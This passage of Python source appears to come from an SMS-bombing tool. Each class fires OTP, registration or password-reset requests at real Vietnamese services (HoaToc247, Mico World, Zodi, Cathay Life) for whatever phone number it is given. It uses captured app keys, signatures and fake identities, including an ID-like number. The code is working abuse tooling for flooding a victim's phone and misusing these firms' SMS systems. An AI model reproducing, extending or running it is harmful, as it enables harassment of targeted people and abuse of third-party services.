                'hash': '6a34ed52dc813de78dc95dd5f7a051e1', 'version': '1.2.45',
                'app-version': '1.2.45', 'time': '1739092657',
                'Content-Type': 'application/json', 'User-Agent': 'HoaToc247/1',
            },
            json={
                'customer': {
                    'rePassword': '123123aAa@', 'password': '123123aAa@',
                    'areaId': '172', 'rePhone': '0357156329', 'phone': phone,
                    'name': 'Nguyen Huy Dol', 'area': {'id': 172, 'name': 'Nga Sơn - Thanh Hóa'},
                },
                'otp': '', 'deviceId': 'E9F41C72-D646-4489-BD13-BC789331B0F4', 'areaId': 172,
            },
            timeout=self.config["http"]["timeout"],
        )
        response = self.session.post(
            'https://api.hoatoc247.com:8080/v1/auth/forgot',
            headers={
                'hash': 'a47cbf5838ff5e902d56068b616ae09c', 'version': '1.2.45',
                'app-version': '1.2.45', 'time': '1739092703',
                'Content-Type': 'application/json', 'User-Agent': 'HoaToc247/1',
            },
            json={'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class MicoGotp(Service):
    name = "MicoGotp"
    category = "other"
    active = True
    description = "Mico World - OTP"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.micoworld.net:443/api/accountkit/phone/verification_code/send',
            headers={
                'language': 'vi', 'did': '6b630b40c619d590ee4e0b3a301c9ac69e4d1b55',
                'user-agent': 'Mico/8.28.0 (iPhone; iOS 17.4.1; Scale/2.00)',
                'content-type': 'application/x-www-form-urlencoded',
            },
            data={'channelType': '0', 'func': '0', 'nonce': '1739093368991901', 'number': phone, 'pkg': 'com.meets.Meets', 'prefix': '84'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Zodi(Service):
    name = "Zodi"
    category = "other"
    active = True
    description = "Zodi - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://pro.zodicorp.vn/api/functions/SendCode',
            params={'sig': 'df7f485b3f449910cb25b304c32a88f7'},
            headers={
                'X-Parse-Application-Id': 'f188e6ad0bcb7e391729b71feb1bd1fc966dffbf',
                'X-Parse-Client-Key': 'e5c06f986b709c9822537a8d7cfd8ff92f32052d',
                'Content-Type': 'application/json', 'User-Agent': 'Zodi/250207.1940',
            },
            json={'checkExists': False, 'countryCode': '84', 'locale': 'vi', 'method': 'sms', 'phoneNumber': phone_intl},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class CathayLife(Service):
    name = "CathayLife"
    category = "other"
    active = True
    description = "Cathay Life - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://www.cathaylife.com.vn',
                'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest',
            },
            data={
                'phone': phone, 'email': 'quadeptraidi@gmail.com', 'LINK_FROM': 'signUp2',
                'CUSTOMER_NAME': 'Natsuno Suki', 'memberID': '', 'POL_HOLDER_NUM': 'undefined',
                'LANGS': 'vi_VN',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class CathayLifeResend(Service):
    name = "CathayLifeResend"
    category = "other"
    active = True
    description = "Cathay Life - Resend OTP"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://www.cathaylife.com.vn',
                'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest',
            },
            data={
                'memberMap': f'{{"userName":"quadeptraidi@gmail.com","password":"123123aA@","birthday":"10/12/1998","certificateNumber":"001203504665","phone":"{phone}","email":"quadeptraidi@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Natsuno Suki"}}',
                'OTP_TYPE': 'P', 'LANGS': 'vi_VN',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)
